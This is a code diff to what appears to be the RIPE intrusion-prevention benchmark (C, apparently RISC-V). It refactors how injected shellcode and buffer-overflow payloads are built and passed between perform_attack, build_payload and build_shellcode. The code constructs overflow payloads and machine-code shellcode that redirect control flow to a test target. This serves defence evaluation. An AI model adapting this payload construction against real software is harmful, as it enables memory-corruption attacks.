@@ -22,9 +22,6 @@
 
 #define print_reason(s) // fprintf(stderr, s)
 
-// shellcode is generated in perform_attack()
-static uint8_t shellcode_nonop[12];
-
 #ifndef RIPE_DEF_TECHNIQUE
     #define RIPE_DEF_TECHNIQUE DIRECT
 #endif
@@ -150,10 +147,6 @@ static const char * const bin4b[16] = {"0000", "0001", "0010", "0011",
                                        "0100", "0101", "0110", "0111",
                                        "1000", "1001", "1010", "1011",
                                        "1100", "1101", "1110", "1111"};
-
-// Do not count for the null terminator since a null in the shellcode will
-// terminate any string function in the standard library
-static size_t size_shellcode_nonop = sizeof(shellcode_nonop);
 
 // control data destinations
 void
@@ -369,7 +362,9 @@ perform_attack(
     char * target_name;
 
     // write shellcode with correct jump address
-    build_shellcode(shellcode_nonop);
+    uint8_t *shellcode = NULL;
+    size_t size_shellcode = 0;
+    build_shellcode(&shellcode, &size_shellcode);
 
     switch (g.attack.location) {
         case STACK:
@@ -658,7 +653,7 @@ perform_attack(
     /* start filling the buffer from that first byte                        */
     buffer[0] = '\0';
 
-    if (!build_payload(&g.payload, target_offset)) {
+    if (!build_payload(&g.payload, target_offset, shellcode, size_shellcode)) {
         if (g.output_debug_info)
             fprintf(stderr, "Error: Could not build payload\n");
         return RET_RT_IMPOSSIBLE;
@@ -779,11 +774,8 @@ perform_attack(
 /* BUILD_PAYLOAD() */
 /*******************/
 bool
-build_payload(struct payload * payload, ptrdiff_t offset)
+build_payload(struct payload * payload, ptrdiff_t offset, uint8_t * shellcode, size_t size_shellcode)
 {
-    size_t size_shellcode = 0, bytes_to_pad;
-    uint8_t * shellcode = NULL;
-
     /* + 1 for null termination so that buffer can be */
     /* used with string functions in standard library */
     payload->size = (offset + sizeof(uintptr_t) + 1);
@@ -794,11 +786,9 @@ build_payload(struct payload * payload, ptrdiff_t offset)
 
     switch (g.attack.inject_param) {
         case INJECTED_CODE_NO_NOP:
-            if (payload->size < (size_shellcode_nonop + sizeof(func_t*))) {
+            if (payload->size < (size_shellcode + sizeof(func_t*))) {
                 return false;
             }
-            shellcode      = shellcode_nonop;
-            size_shellcode = size_shellcode_nonop;
             break;
         case DATA_ONLY:
             if (g.attack.code_ptr == VAR_LEAK) {
@@ -839,7 +829,7 @@ build_payload(struct payload * payload, ptrdiff_t offset)
 
     /* Calculate number of bytes to pad with */
     /* size - shellcode - target address - null terminator */
-    bytes_to_pad =
+    size_t bytes_to_pad =
       (payload->size - size_shellcode - sizeof(void *) - sizeof(char));
 
     /* Pad payload buffer with dummy bytes */
@@ -983,8 +973,16 @@ data_leak(uint8_t *buf) {
 /* BUILD_SHELLCODE() */
 /*********************/
 void
-build_shellcode(uint8_t * shellcode)
+build_shellcode(uint8_t **shellcode, size_t *size_shellcode)
 {
+    // shellcode is generated in perform_attack()
+    static uint8_t shellcode_nonop[12];
+    *shellcode = shellcode_nonop;
+
+    // Do not count for the null terminator since a null in the shellcode will
+    // terminate any string function in the standard library
+    *size_shellcode = sizeof(shellcode_nonop);
+
     char attack_addr[9], low_bits[4], high_bits[6];  // target address and its components
     // fix shellcode when lower bits would become negative
     if (((uintptr_t)&shellcode_target & 0x00000fff) >= 0x800)
@@ -1020,9 +1018,9 @@ build_shellcode(uint8_t * shellcode)
     strncat(addi_bin, "00110000001100010011", 20);
     addi_val = strtoul(addi_bin, 0, 2);
 
-    format_instruction(shellcode, lui_val);
-    format_instruction(shellcode + 4, addi_val);
-    format_instruction(shellcode + 8, jalr_val);
+    format_instruction(shellcode_nonop, lui_val);
+    format_instruction(shellcode_nonop + 4, addi_val);
+    format_instruction(shellcode_nonop + 8, jalr_val);
 
     char lui_s[9], addi_s[9]; // hex insn encodings
     hex_to_string(lui_s, lui_val);
